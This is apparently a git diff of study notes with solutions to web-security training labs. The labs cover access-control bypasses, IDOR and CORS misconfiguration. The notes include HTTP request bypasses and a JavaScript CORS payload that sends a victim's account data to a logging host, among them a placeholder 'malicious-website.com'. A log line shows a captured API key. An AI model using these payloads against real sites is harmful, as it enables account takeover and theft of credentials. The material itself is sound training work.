@@ -30,17 +30,15 @@ Notes and ```lab``` solutions/hints.
 - Restricting certain HTTP methods
 - *Custom http headers to override restricted urls*
 
+#### [Lab]: URL-based access control can be circumvented
 ```
-[Lab]: URL-based access control can be circumvented
-
 POST / HTTP/1.1
 Cookie: session=FQxqrQ8PJHEBARHT7se4bxv6sqHGrQJD
 X-Original-URL: /admin
 ```
 
+#### [Lab]: Method-based access control can be circumvented
 ```
-[Lab]: Method-based access control can be circumvented
-
 Login as wiener/peter:
 PUT /admin-roles HTTP/1.1
 Cookie: session=UdlpEENsbTjmMhi15gFrGZLzPJlprpTK
@@ -48,28 +46,23 @@ username=wiener&action=upgrade
 ```
 
 ### Horizontal Privilege Escalation
-
+#### [Lab]: User ID controlled by request parameter
 ```
-[Lab]: User ID controlled by request parameter
-
 Login as wiener/peter:
 /my-account?id=carlos
 
 Copy and submit the API key
 ```
 
+#### [Lab]: User ID controlled by request parameter, with unpredictable user IDs 
 ```
-[Lab]: User ID controlled by request parameter, with unpredictable user IDs 
-
 Login as wiener/peter:
 Go to /post?postId=3, to find carlos' userId.
 User that userId to get API key from My Account page.
-
 ```
 
+#### [Lab]: User ID controlled by request parameter with data leakage in redirect
 ```
-[Lab]: User ID controlled by request parameter with data leakage in redirect
-
 Login as wiener/peter
 Go to /my-account?id=carlos => it redirects back to home page
 Go to /my-account?id=carlos and intercept the response in Burp
@@ -78,9 +71,8 @@ Before redirection, the API key for carlos is leaked.
 
 ### Horizontal to vertical privilege escalation
 
+#### [Lab]: User ID controlled by request parameter with password disclosure
 ```
-[Lab]: User ID controlled by request parameter with password disclosure
-
 Login as wiener/peter
 Go to /my-account?user=administrator
 Change input type of password to text
@@ -98,9 +90,8 @@ IDOR vulnerabilities often arise when sensitive resources are located in static 
 
 ``` https://insecure-website.com/static/12144.txt```
 
+#### [Lab]: Insecure Direct Object References
 ```
-[Lab]: Insecure Direct Object References
-
 Login as wiener/peter
 Go to /chat and Download Transcript
 Intercept request in Burp to see that transcript is being downloaded from /download-transcript/2.txt
@@ -110,9 +101,8 @@ Login to carlos' account
 ```
 
 ### Access control vulnerabilities in multi-step processes
-
+#### [Lab]: Multi-step process with no access control on one step
 ```
-[Lab]: Multi-step process with no access control on one step
 
 Login as adminstrator/admin
 Observe request for upgrading a user:
@@ -123,11 +113,9 @@ action=upgrade&confirmed=true&username=wiener
 Repeat the request while logged in as wiener
 ```
 
-### Referer-based access control
+### [Lab]: Referer-based access control
 
 ```
-[Lab]:
-
 Login as administrator/admin
 Go to /admin
 Upgrade a user and intercept the request in Burp
@@ -136,7 +124,6 @@ GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
 Referer: https://ace91fd81fbaa096804b8c630061001c.web-security-academy.net/admin
 
 Login as wiener/peter and send the request.
-
 ```
 
 ### Location-based access control
@@ -157,7 +144,7 @@ Circumvented using web proxies, VPNs, or manipulation of client-side geolocation
 - Aims to prevent websites from attacking each other.
 - An origin consists of a URI scheme, domain and port number.
 - Without the same-origin policy, if you visited a malicious website it could send requests to other websites (Facebook, Gmail) whose cookies are already present in the browser.
-- SOP allows embedding of images via the <img> tag, media via the <video> tag and JavaScript includes with the <script> tag.
+- SOP allows embedding of images via the ```<img>``` tag, media via the ```<video>``` tag and JavaScript includes with the ```<script>``` tag.
 - Any JavaScript on the page won't be able to read the contents of the above resources. 
 - SOP more relaxed when dealing with cookies, can be accessible from subdomains.
 - Possible to relax same-origin policy using document.domain.
@@ -166,9 +153,9 @@ Circumvented using web proxies, VPNs, or manipulation of client-side geolocation
 - CORS protocol uses HTTP headers to define trusted web origin and authentication access.
 - These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access.
 
-###```Access-Control-Allow-Origin``` / ACAO response header
+### ```Access-Control-Allow-Origin``` / ACAO response header
 
-```normal-website.com``` sends the following cross-origin request.
+** ```normal-website.com``` sends the following cross-origin request: **
 
 ```
 GET /data HTTP/1.1
@@ -176,7 +163,7 @@ Host: robust-website.com
 Origin : https://normal-website.com 
 ```
 
-```robust-website.com``` replies with
+** ```robust-website.com``` replies with: **
 
 ```
 HTTP/1.1 200 OK
@@ -218,26 +205,43 @@ location='//malicious-website.com/log?key='+this.responseText;
 }; 
 ```
 
-```
-[Lab]: CORS vulnerability with basic origin reflection
+#### [Lab]: CORS vulnerability with basic origin reflection
 
-Login as wiener/peter
-Go to /my-account
-/my-account?id=admin is blocked
+1. Login as wiener/peter
+2. Go to /my-account
+3. /my-account?id=admin is blocked
+
+
+```
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Cookie: session=RP4LxEeQbjJvfMad0sA9P4ECWmB3r99S
+
+
+Access-Control-Allow-Origin: https://acf41fe01f16167180030e2a00fd001d.web-security-academy.net
+Access-Control-Allow-Credentials: true
+```
 
 Go to exploit server:
-
+```
 <script>
+
 	var req = new XMLHttpRequest();
 	req.onload = reqListener;
-	req.open('get','https://acf41fe01f16167180030e2a00fd001d.web-security-academy.net/my-account?id=wiener',true);
+	req.open('get','https://acf41fe01f16167180030e2a00fd001d.web-security-academy.net/accountDetails',true);
 	req.withCredentials = true;
 	req.send();
 
 	function reqListener() {
-		location='//acf41fe01f16167180030e2a00fd001d.web-security-academy.net/log?key='+this.responseText;
+		location='//ac401f581f15167f809a0e1701320092.web-security-academy.net/log?key='+this.responseText;
 	};
+
 </script>
-
-
 ```
+
+Submit exploit to victim and go to /log:
+```
+192.168.1.12    2020-02-05 19:14:00 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22hvhwIMzFHlIEZpEPGhdJ9EAzV06nOMmw%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/661765"
+```
+
+### Errors parsing Origin headers
